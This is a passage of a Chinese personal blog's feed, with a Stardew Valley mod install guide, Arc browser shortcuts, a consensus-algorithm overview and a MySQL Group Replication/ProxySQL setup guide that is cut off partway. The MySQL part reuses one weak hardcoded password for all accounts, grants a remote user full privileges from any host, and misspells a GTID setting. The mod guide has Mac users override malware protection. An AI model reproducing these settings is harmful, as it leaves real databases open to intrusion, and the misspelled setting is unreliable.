    <category term="微服务" scheme="http://blog.hoshinobunny.xyz/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>星露谷(v1.6)mod安装教程</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/21/%E6%98%9F%E9%9C%B2%E8%B0%B7%EF%BC%88v1.6%EF%BC%89mod%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/21/%E6%98%9F%E9%9C%B2%E8%B0%B7%EF%BC%88v1.6%EF%BC%89mod%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</id>
    <published>2024-11-21T09:29:57.000Z</published>
    <updated>2025-03-08T08:59:34.069Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[!NOTE]</p><p>前情提要：因为今天邢老板心血来潮说想玩星露谷，于是我就整理了一点常用的mod来加强邢老板的新手体验😉</p></blockquote><h1 id="mod安装教程"><a href="#mod安装教程" class="headerlink" title="mod安装教程"></a>mod安装教程</h1><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=1701782225&bvid=BV1XK421x7H9&cid=1585963427&p=1&autoplay=0&high_quality=1&danmaku=0"  border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="100%" height="600"> </iframe><blockquote><p>[!NOTE]</p><p>mod下载网址：<a href="https://www.nexusmods.com/stardewvalley/mods/">https://www.nexusmods.com/stardewvalley/mods/</a></p><p>必须要先安装mod加载器<code>SMAPI</code>，解压<code>SMAPI-4.1.7-installer.zip</code>后根据操作系统运行相应的脚本即可。</p><p>一个压缩包是一个mod，解压后将文件夹拖入<code>星露谷物语</code>游戏安装路径下的<code>mod</code>文件夹即可。</p><p>有些mod需要安装必要的前置mod。</p></blockquote><p>mac启动游戏时如果出现以下报错，需要将<code>StardewModdingAPI</code>从废纸篓中移回原位，添加文件后缀<code>.app</code>，右键打开<code>显示简介</code>，勾选<code>恶意软件保护覆盖</code>，然后把后缀还原即可正常启动游戏。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2025/03/08/image-20250308165530764.png" alt="image-20250308165530764"></p><h1 id="推荐mod列表"><a href="#推荐mod列表" class="headerlink" title="推荐mod列表"></a>推荐mod列表</h1><ul><li>Generic Mod Config Menu 通用Mod配置级菜单 5098</li><li>AutomaticGates 自动栅栏 3109</li><li>ChestsAnywhere 远程宝箱仓库 518</li><li>EideeEasyFishing 秒钓鱼 4806&#x2F;20391</li><li>LookupAnything 查看所有信息 541</li><li>PassableCrops 穿透作物 15223</li><li>UIInfoSuite2 显示当日信息 <a href="https://github.com/Annosz/UIInfoSuite2/releases">https://github.com/Annosz/UIInfoSuite2/releases</a></li><li>VisibleFish 显示当前可以钓的鱼 8897</li><li>ZoomLevel 增加视距 7363</li><li>PonyWeightLossProgram 小马减肥 1232</li><li>FastAnimations 动作加速 1089</li><li>LadderLocator 显示矿洞楼梯位置 3094</li><li>Chests Anywhere 随处打开箱子 518</li><li>Visible FIsh 可见鱼 8897</li><li>Automate 自动化 1063</li><li>SkullCavernElevator 骷髅矿洞电梯 963</li><li>Fast Animations 快速动画 1089</li><li>Tractor Mod 拖拉机 1401</li><li>CJB Cheats Menu CJB作弊菜单 4</li><li>CJB Item Spawner CJB扳手：93</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[!NOTE]&lt;/p&gt;
&lt;p&gt;前情提要：因为今天邢老板心血来潮说想玩星露谷，于是我就整理了一点常用的mod来加强邢老板的新手体验😉&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;mod安装教程&quot;&gt;&lt;a href=&quot;#mod安装教程&quot; cla</summary>
      
    
    
    
    <category term="Game" scheme="http://blog.hoshinobunny.xyz/categories/Game/"/>
    
    
    <category term="星露谷物语" scheme="http://blog.hoshinobunny.xyz/tags/%E6%98%9F%E9%9C%B2%E8%B0%B7%E7%89%A9%E8%AF%AD/"/>
    
    <category term="攻略教程" scheme="http://blog.hoshinobunny.xyz/tags/%E6%94%BB%E7%95%A5%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Arc浏览器快捷键</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/15/Arc%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/15/Arc%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
    <published>2024-11-15T06:09:21.000Z</published>
    <updated>2024-11-25T09:05:05.216Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arc-的标签页"><a href="#Arc-的标签页" class="headerlink" title="Arc 的标签页"></a><strong>Arc 的标签页</strong></h3><p>1️⃣ 标签页是浏览的重要组成部分，它允许你同时打开多个网页。不过，与传统浏览器不同的是，<strong>Arc 采用了垂直排列标签页的方式</strong>，这可以说使打开大量标签页比采用水平布局时更易于管理。下面列出了在 Arc 中管理标签页最有用的快捷方式，以充分利用 Arc 独特的<strong>标签页管理功能，包括归档、固定和清除标签页</strong>。</p><table><thead><tr><th>Command + T</th><th>新建标签页</th></tr></thead><tbody><tr><td>Command+ W</td><td>关闭标签页</td></tr><tr><td>Command + Shift + T</td><td>重新打开关闭的标签页</td></tr><tr><td>Command + {</td><td>上一个标签页</td></tr><tr><td>Command + Option + ↑</td><td>前一个标签页（备选）</td></tr><tr><td>Command + Option + ↓</td><td>下一个标签页</td></tr><tr><td>Command + }</td><td>下一个标签页（备选）</td></tr><tr><td>Command + Shift + K</td><td>清除未固定的标签页</td></tr><tr><td>Command + D</td><td>固定&#x2F;取消固定标签页</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Arc的空间（Space）功能"><a href="#Arc的空间（Space）功能" class="headerlink" title="Arc的空间（Space）功能"></a>Arc的空间（Space）功能</h3><p>2️⃣ 空间是 Arc 浏览器的独特功能之一，它允许你将标签分组到单独的工作空间。如果你想按主题或项目对标签页进行分组，这将非常有用，因为这样可以让你的工作空间更有条理、更整洁，从而有助于保持注意力和工作效率。每个空间都可以有自己的名称、主题甚至图标。通过点击侧边栏空间切换器菜单中的空间图标，或使用以下键盘快捷键，你可以快速切换空间。</p><table><thead><tr><th>Arc 的空间管理快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + Option + →</td><td>下一个空间</td></tr><tr><td>Command + Option + ←</td><td>上一个空间</td></tr><tr><td>Control + 1</td><td>前往空间 1</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="分栏模式-Split-View"><a href="#分栏模式-Split-View" class="headerlink" title="分栏模式(Split View)"></a>分栏模式(Split View)</h3><p>3️⃣ Arc中的独特功能之一是分栏模式。它允许您在同一窗口中并排查看两个网页。它非常适合多任务处理、研究和比较任务。</p><p>为了帮助您充分利用此功能，Arc提供了一些键盘快捷键，使管理您的Split View窗口变得容易。</p><table><thead><tr><th>分栏模式快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Control + Shift + ]</td><td>切换到下一个分栏模式</td></tr><tr><td>Control + Shift + [</td><td>切换到前一个分栏模式</td></tr><tr><td>Control + Shift + &#x3D;</td><td>添加分栏模式（最多4个）</td></tr><tr><td>Control + Shift + –</td><td>删除现有的分栏模式</td></tr><tr><td>Control + Shift + #</td><td>切换到分栏模式＃（第 n 个）</td></tr></tbody></table><h3 id="Arc-自带的笔记功能-Arc-Note"><a href="#Arc-自带的笔记功能-Arc-Note" class="headerlink" title="Arc 自带的笔记功能(Arc Note)"></a>Arc 自带的笔记功能(Arc Note)</h3><p>4️⃣ Arc 的另一项独特内置功能是<strong>笔记</strong>，您可以直接在浏览器中<strong>创建和保存笔记，而无需使用外部应用程序。你可以为任何事情创建笔记，从记下快速想法到记录待办事项、研究笔记等。与标签页和网页类似，你也可以</strong>将笔记整理到文件夹和空间中。让我们来看看管理笔记的一些快捷方式。</p><table><thead><tr><th>Arc 笔记快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Control + N</td><td>新建笔记</td></tr><tr><td>Control + Option + N</td><td>在分栏模式新建笔记</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Arc的页面导航"><a href="#Arc的页面导航" class="headerlink" title="Arc的页面导航"></a>Arc的<strong>页面导航</strong></h3><p>5️⃣ 使用键盘快捷键浏览网页可以节省时间，而且比使用鼠标或触控板更快、更有效。以下是 Arc 中用于高效页面导航的一些<strong>键盘快捷键</strong>。</p><table><thead><tr><th>页面导航快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + +</td><td>放大页面</td></tr><tr><td>Command + –</td><td>缩小页面</td></tr><tr><td>Command + 0</td><td>缩放至实际大小</td></tr><tr><td>Command + F</td><td>在页面上查找文本</td></tr><tr><td>Command + G</td><td>查找下一个匹配结果</td></tr><tr><td>Command + Shift + G</td><td>查找上一个匹配结果</td></tr><tr><td>Command + Option + F</td><td>查找并替换文本</td></tr><tr><td>Command + J</td><td>跳转到所选内容</td></tr><tr><td>Command + ←</td><td>后退一页</td></tr><tr><td>Command + →</td><td>前进一页（备选方式）</td></tr><tr><td>Command + [</td><td>后退一页（备选方式）</td></tr><tr><td>Command + ]</td><td>前进到下一页</td></tr><tr><td>Command + Control + F</td><td>切换全屏模式开启&#x2F;关闭</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Arc-的页面控制"><a href="#Arc-的页面控制" class="headerlink" title="Arc 的页面控制"></a>Arc 的<strong>页面控制</strong></h3><p>6️⃣ 这些控制功能对于需要操作和测试网页的高级用户和网页开发人员非常重要，例如屏幕截图、复制当前页面的URL、打开开发者工具以检查和编辑页面的HTML和CSS等等。</p><p>类似地，使用键盘快捷键可以节省时间，减少浏览菜单和设置的需要。下面让我们看一些这些键盘快捷键。</p><table><thead><tr><th>页面控制快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + Option + I</td><td>检查元素</td></tr><tr><td>Command + Option + C</td><td>检查元素</td></tr><tr><td>Command + Option + J</td><td>JavaScript控制台</td></tr><tr><td>Control + C</td><td>光标选择器</td></tr><tr><td>Command + Shift + S</td><td>另存为…</td></tr><tr><td>Command + P</td><td>打印</td></tr><tr><td>Command + Option + Shift + V</td><td>粘贴并匹配样式</td></tr><tr><td>Command + Shift + 2</td><td>屏幕截图</td></tr><tr><td>Command + R</td><td>刷新页面</td></tr><tr><td>Command + Shift + R</td><td>强制刷新页面</td></tr><tr><td>Command + .</td><td>停止加载</td></tr><tr><td>Command + Shift + C</td><td>复制当前页面的网页</td></tr><tr><td>Command + Shift + Option + C</td><td>将当前页面的网页复制为Markdown格式</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Arc-的浏览器窗口"><a href="#Arc-的浏览器窗口" class="headerlink" title="Arc 的浏览器窗口"></a>Arc 的<strong>浏览器窗口</strong></h3><p>7️⃣ 这些快捷键允许您执行常见操作，例如<strong>打开新窗口、最小化或退出浏览器</strong>。对于大多数人来说，它们与其他浏览器中的快捷键基本相同。因此，如果您之前已经使用过这些快捷键，您应该会立刻感到熟悉。</p><table><thead><tr><th>浏览器窗口管理快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + N</td><td>新建浏览器窗口</td></tr><tr><td>Command + Shift + N</td><td>新建隐身浏览器窗口</td></tr><tr><td>Command + W</td><td>关闭浏览器窗口</td></tr><tr><td>Command + H</td><td>隐藏 Arc 浏览器</td></tr><tr><td>Command + Shift + H</td><td>隐藏除 Arc 浏览器外的所有内容</td></tr><tr><td>Command + M</td><td>最小化浏览器窗口</td></tr><tr><td>Command + Q</td><td>退出 Arc 浏览器</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Little-Arc（小浏览器）"><a href="#Little-Arc（小浏览器）" class="headerlink" title="Little Arc（小浏览器）"></a><strong>Little Arc（小浏览器）</strong></h3><p>8️⃣ “Little Arc”是Arc浏览器中的一项独特功能，它<strong>打开一个无边框的窗口，一次只包含一个页面</strong>，非常适合快速查找；在不中断主要工作流程或窗口的情况下快速轻松地访问信息。</p><p>通过下面的键盘快捷键，您可以充分利用这一功能，进一步提高您的生产力。</p><table><thead><tr><th>Little Arc 快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + Option + N</td><td>新建 Little Arc 窗口</td></tr><tr><td>Command + O</td><td>打开 Little Arc 标签页</td></tr><tr><td>Command + Shift + O</td><td>显示 Little Arc 的 “打开方式” 菜单</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Arc其他快捷键"><a href="#Arc其他快捷键" class="headerlink" title="Arc其他快捷键"></a>Arc其他快捷键</h3><p>9️⃣ Arc浏览器还配备了其他实用的快捷键。其中一些快捷键可能不太常用，但我相信随着您对其进行更多探索，您会发现它们在改善特定任务和工作流程方面非常方便。</p><table><thead><tr><th>其他快捷键</th><th>功能描述</th></tr></thead><tbody><tr><td>Command + 逗号</td><td>进入偏好设置</td></tr><tr><td>Command + Shift + J</td><td>查看下载内容</td></tr><tr><td>Command + Y</td><td>查看历史记录</td></tr><tr><td>Command + Shift + L</td><td>打开库</td></tr><tr><td>Command + E</td><td>打开扩展</td></tr><tr><td>Command + Option + U</td><td>查看页面源代码</td></tr><tr><td>Command + Shift + R</td><td>进入阅读模式</td></tr><tr><td>Command + L</td><td>启动命令栏</td></tr><tr><td>Command + S</td><td>显示&#x2F;隐藏侧边栏</td></tr><tr><td>Command + #</td><td>转到侧边栏项目 #（1、2等）</td></tr><tr><td>Control + Shift + E</td><td>新建画布</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Arc-的标签页&quot;&gt;&lt;a href=&quot;#Arc-的标签页&quot; class=&quot;headerlink&quot; title=&quot;Arc 的标签页&quot;&gt;&lt;/a&gt;&lt;strong&gt;Arc 的标签页&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;1️⃣ 标签页是浏览的重要组成部分，它允许你同时打开多个网</summary>
      
    
    
    
    <category term="杂项" scheme="http://blog.hoshinobunny.xyz/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="Arc" scheme="http://blog.hoshinobunny.xyz/tags/Arc/"/>
    
    <category term="使用技巧" scheme="http://blog.hoshinobunny.xyz/tags/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>区块链中的共识算法</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%AD%E7%9A%84%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%AD%E7%9A%84%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2024-11-13T11:58:41.000Z</published>
    <updated>2024-11-21T09:37:31.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="POW（Proof-of-Work，工作量证明）"><a href="#POW（Proof-of-Work，工作量证明）" class="headerlink" title="POW（Proof of Work，工作量证明）"></a>POW（Proof of Work，工作量证明）</h1><p>POW（Proof of Work，工作量证明）是一种共识算法，主要用于区块链网络中。它的核心思想是通过解决复杂的数学问题来验证交易并创建新的区块。以下是POW的主要特点：</p><ul><li>计算密集型：矿工需要进行大量的计算来解决难题，这个过程被称为”挖矿”。</li><li>难度可调：网络会根据总算力自动调整难度，以保持出块时间相对稳定。</li><li>防篡改：一旦区块被确认，修改历史交易将变得极其困难。</li><li>去中心化：任何人都可以参与挖矿，不需要得到许可。</li></ul><p>POW的优点包括高度安全性和去中心化，但也存在能源消耗大、交易确认慢等缺点。比特币是使用POW共识算法的最著名例子。</p><h1 id="POS（Proof-of-Stake，权益证明）"><a href="#POS（Proof-of-Stake，权益证明）" class="headerlink" title="POS（Proof of Stake，权益证明）"></a>POS（Proof of Stake，权益证明）</h1><p>POS（Proof of Stake，权益证明）是另一种常用的区块链共识算法。与POW不同，POS不依赖于计算能力，而是基于持币量和持币时间来选择验证者。以下是POS的主要特点：</p><ul><li>能源效率高：不需要大量计算，因此能耗较低。</li><li>安全性：攻击者需要控制大量代币才能影响网络，成本很高。</li><li>去中心化：任何持有足够代币的人都可以成为验证者。</li><li>速度快：交易确认通常比POW更快。</li></ul><p>POS的优点包括能源效率高、交易速度快，但也存在一些争议，如”富者更富”的问题。以太坊2.0是一个正在向POS转型的著名例子。</p><h1 id="POA（Proof-of-Authority，权威证明）"><a href="#POA（Proof-of-Authority，权威证明）" class="headerlink" title="POA（Proof of Authority，权威证明）"></a>POA（Proof of Authority，权威证明）</h1><p>POA（Proof of Authority，权威证明）是一种基于声誉的共识算法，主要用于私有或联盟链中。以下是POA的主要特点：</p><ul><li>中心化程度较高：验证者通常是预先选定的可信实体，如公司、组织或个人。</li><li>高效率：由于验证者数量有限且身份已知，共识过程非常快速。</li><li>低能耗：不需要进行复杂的计算，因此能源消耗较低。</li><li>身份透明：验证者的身份是公开的，这有助于建立信任。</li></ul><p>POA的优点包括高效率、低成本和可预测性，但其较高的中心化程度可能不适合所有应用场景。POA常用于企业级区块链解决方案，如供应链管理或身份验证系统。</p><h1 id="POH（Proof-of-History，历史证明）"><a href="#POH（Proof-of-History，历史证明）" class="headerlink" title="POH（Proof of History，历史证明）"></a>POH（Proof of History，历史证明）</h1><p>POH（Proof of History，历史证明）是一种由 Solana 区块链引入的创新共识算法。它的主要特点如下：</p><ul><li>时间戳机制：POH 创建了一个历史记录，证明某个事件发生在特定的时间点之前或之后。</li><li>高效率：通过将时间编码到区块链中，POH 显著提高了网络的效率和吞吐量。</li><li>可验证性：网络中的所有节点都可以独立验证时间顺序，无需相互协调。</li><li>低延迟：POH 能够实现极低的交易确认时间，通常在亚秒级别。</li></ul><p>POH 通常与 POS（权益证明）结合使用，形成一个更强大、更高效的共识机制。Solana 区块链就是采用这种组合方式，因此能够实现极高的交易处理速度和可扩展性。</p><p>POH 的优点包括极高的效率和可扩展性，但也面临一些挑战，如网络中央化程度较高的问题。尽管如此，它仍然是区块链技术中一个非常有前景的创新。</p><h1 id="PBFT（Practical-Byzantine-Fault-Tolerance，实用拜占庭容错）"><a href="#PBFT（Practical-Byzantine-Fault-Tolerance，实用拜占庭容错）" class="headerlink" title="PBFT（Practical Byzantine Fault Tolerance，实用拜占庭容错）"></a>PBFT（Practical Byzantine Fault Tolerance，实用拜占庭容错）</h1><p>PBFT（Practical Byzantine Fault Tolerance，实用拜占庭容错）是一种用于分布式系统的共识算法，特别适用于需要高吞吐量和低延迟的私有或联盟链环境。以下是PBFT的主要特点：</p><ul><li>高效率：相比POW和POS，PBFT能够更快地达成共识，通常只需要几秒钟。</li><li>确定性：一旦达成共识，交易就被立即确认，不存在分叉的可能性。</li><li>容错能力：能够在部分节点出现故障或恶意行为的情况下仍然正常运行。</li><li>适用性：特别适合于参与者身份已知且数量有限的系统，如企业级区块链。</li></ul><p>PBFT的工作原理基于多轮投票，需要至少2&#x2F;3的诚实节点达成一致才能确认交易。这种机制保证了系统的安全性和可靠性，但也限制了其可扩展性，因为随着节点数量的增加，通信开销会急剧增大。</p><p>尽管PBFT在某些方面有局限性，但它仍然是许多区块链项目的首选共识算法，特别是在企业级应用中。例如，超级账本（Hyperledger Fabric）就采用了PBFT的变体作为其共识机制之一。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;POW（Proof-of-Work，工作量证明）&quot;&gt;&lt;a href=&quot;#POW（Proof-of-Work，工作量证明）&quot; class=&quot;headerlink&quot; title=&quot;POW（Proof of Work，工作量证明）&quot;&gt;&lt;/a&gt;POW（Proof of W</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="区块链" scheme="http://blog.hoshinobunny.xyz/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="共识算法" scheme="http://blog.hoshinobunny.xyz/tags/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>搭建MGR+ProxySQL集群</title>
    <link href="http://blog.hoshinobunny.xyz/2024/11/03/%E6%90%AD%E5%BB%BAMGR+ProxySQL%E9%9B%86%E7%BE%A4/"/>
    <id>http://blog.hoshinobunny.xyz/2024/11/03/%E6%90%AD%E5%BB%BAMGR+ProxySQL%E9%9B%86%E7%BE%A4/</id>
    <published>2024-11-03T13:29:41.000Z</published>
    <updated>2024-11-21T09:37:23.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建MGR-ProxySQL集群"><a href="#搭建MGR-ProxySQL集群" class="headerlink" title="搭建MGR+ProxySQL集群"></a>搭建MGR+ProxySQL集群</h1><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><ul><li>设置好ip地址、网关</li><li>修改hosts文件</li><li>修改主机名称</li><li>MySQL节点防火墙放行 3306 和 24901，ProxySQL放行6032和6033端口</li></ul><h2 id="MySQL配置"><a href="#MySQL配置" class="headerlink" title="MySQL配置"></a>MySQL配置</h2><h3 id="master节点"><a href="#master节点" class="headerlink" title="master节点"></a>master节点</h3><p>sudo cat  &gt;&gt; &#x2F;etc&#x2F;my.cnf &lt;&lt;-‘EOF’</p><ul><li><p>设置插件路径</p><p><code>plugin_dir=/usr/lib64/mysql/plugin</code></p></li><li><p>服务器编号</p><p><code>server_id=1</code></p></li><li><p>打开binlog的 GTID 模式</p><p><code>gtid_mode=ON</code></p><p><code>enforce_gitd_consistency=ON</code></p></li><li><p>关闭binlog校验</p><p><code>binlog_checksum=NONE</code></p></li><li><p>定义事务期间哈希写入提取的算法，组复制模式下必须为 XXHASH64</p><p><code>transaction_write_set_extraction=XXHASH64</code></p></li><li><p>服务器所在复制组的名称，有效的 UUID，所有节点相同</p><p><code>loose-group-replication_group_name=&quot;7093d4fa-4425-4c2f-849b-841b62f40a01&quot;</code></p></li><li><p>确定服务器是否应该在服务器启动期间启动组复制</p><p><code>loose-group_replication_start_on_boot=OFF</code></p></li><li><p>为复制组其他成员提供的网络地址，指定为”主机:端口”的格式化字符串，此处端口为24901</p><p><code>loose-group_replication_local_address=&quot;n0:24901&quot;</code></p></li><li><p>建立新组成员到组的连接组成员列表</p><p><code>loose-group_replication_group_seeds=&quot;n0:24901,n1:24901,n2:24901&quot;</code></p></li><li><p>配置此服务器为引导组，此选项必须仅在一台服务器上设置，仅第一次或启动组时打开。成功引导组启动后，置为关闭</p><p><code>loose-group_replication_bootstrap_group=OFF</code></p></li><li><p>启动MySQL服务器</p></li></ul><p>​<code>systemctl start mysqld</code></p><h3 id="slave节点"><a href="#slave节点" class="headerlink" title="slave节点"></a>slave节点</h3><ul><li><p>设置插件路径</p><p><code>plugin_dir=/usr/lib64/mysql/plugin</code></p></li><li><p>服务器编号</p><p><code>server_id=2</code></p></li><li><p>打开binlog的 GTID 模式</p><p><code>gtid_mode=ON</code></p><p><code>enforce_gitd_consistency=ON</code></p></li><li><p>关闭binlog校验</p><p><code>binlog_checksum=NONE</code></p></li><li><p>此参数决定master节点到slave节点的请求是否基于RSA密钥对的密码交换所需的公钥</p><p><code>loose-group_replication_recovery_get_public_key=ON</code></p></li><li><p>服务器所在复制组的名称，有效的 UUID，所有节点相同</p><p><code>loose-group-replication_group_name=&quot;7093d4fa-4425-4c2f-849b-841b62f40a01&quot;</code></p></li><li><p>确定服务器是否应该在服务器启动期间启动组复制</p><p><code>loose-group_replication_start_on_boot=OFF</code></p></li><li><p>为复制组其他成员提供的网络地址，指定为”主机:端口”的格式化字符串，此处端口为24901</p><p><code>loose-group_replication_local_address=&quot;n1:24901&quot;</code></p></li><li><p>建立新组成员到组的连接组成员列表</p><p><code>loose-group_replication_group_seeds=&quot;n0:24901,n1:24901,n2:24901&quot;</code></p></li><li><p>配置此服务器为引导组，此选项必须仅在一台服务器上设置，仅第一次或启动组时打开。成功引导组启动后，置为关闭</p><p><code>loose-group_replication_bootstrap_group=OFF</code></p></li></ul><h2 id="初始化MySQL"><a href="#初始化MySQL" class="headerlink" title="初始化MySQL"></a>初始化MySQL</h2><ul><li><p>连接后修改初始密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>  IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;asAS123456!&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>创建rpl_user账户，此账户用于实现主从数据同步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> rpl_user@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;asAS123456!&#x27;</span>; </span><br></pre></td></tr></table></figure></li><li><p>赋予主从同步权限 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> rpl_user@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>创建一个远程连接用户，用于Navcate登录的时候使用，避免直接使用root登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;remote&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;asAS123456!&#x27;</span>; </span><br></pre></td></tr></table></figure></li><li><p>为remote用户赋予所有数据库资源的访问权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> remote@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>让刚才的修改生效 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES; </span><br></pre></td></tr></table></figure></li><li><p>删除已产生的Binlog，一定要RESET MASTER，它会删除刚才已产生的Binlog，因为刚才Binglog包含创建用户这种高权限操作，用于主从同步的rpl_user账户是没有权限执行的，这就会导致RelayLog重放无法正确执行，导致从属服务器卡死在”RECEVERING”状态</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESET MASTER; </span><br></pre></td></tr></table></figure></li></ul><h2 id="安装MGR插件"><a href="#安装MGR插件" class="headerlink" title="安装MGR插件"></a>安装MGR插件</h2><ul><li><p>每一台节点，在MySQL提示符状态下，使用INSTALL PLUGIN安装MGR插件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSTALL PLUGIN group_replication SONAME <span class="string">&#x27;group_replication.so&#x27;</span>; </span><br></pre></td></tr></table></figure></li></ul><h2 id="进行组网数据同步"><a href="#进行组网数据同步" class="headerlink" title="进行组网数据同步"></a>进行组网数据同步</h2><h3 id="Master节点"><a href="#Master节点" class="headerlink" title="Master节点"></a>Master节点</h3><ul><li><p>在 primary.cnf 配置文件中把group_replication_bootstrap_group 参数设置成 OFF，在 primary 服务器启动时并不会直接启动复制组，通过下面的命令动态的开启复制组是我们的集群更安全。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> group_replication_bootstrap_group<span class="operator">=</span><span class="keyword">ON</span>; </span><br><span class="line"><span class="keyword">START</span> GROUP_REPLICATION; </span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> group_replication_bootstrap_group<span class="operator">=</span>OFF; </span><br></pre></td></tr></table></figure></li><li><p>运行成功，可以在linux命令提示符下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/mysqld.log </span><br></pre></td></tr></table></figure></li><li><p>看到下面的数据代表Master启动成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022-03-04T03:15:12.930686Z 34 [System] [MY-011510] [Repl]  </span><br><span class="line">Plugin group_replication reported: &#x27;This server is working as primary member.&#x27; </span><br></pre></td></tr></table></figure></li></ul><h3 id="Slave节点"><a href="#Slave节点" class="headerlink" title="Slave节点"></a>Slave节点</h3><ul><li><p>指定主从账户与指定通信频道 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHANGE MASTER <span class="keyword">TO</span> MASTER_USER<span class="operator">=</span>&quot;rpl_user&quot;, MASTER_PASSWORD<span class="operator">=</span>&quot;asAS123456!&quot; <span class="keyword">FOR</span> CHANNEL <span class="string">&#x27;group_replication_recovery&#x27;</span>; </span><br></pre></td></tr></table></figure></li><li><p>开启组网数据同步 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> GROUP_REPLICATION; 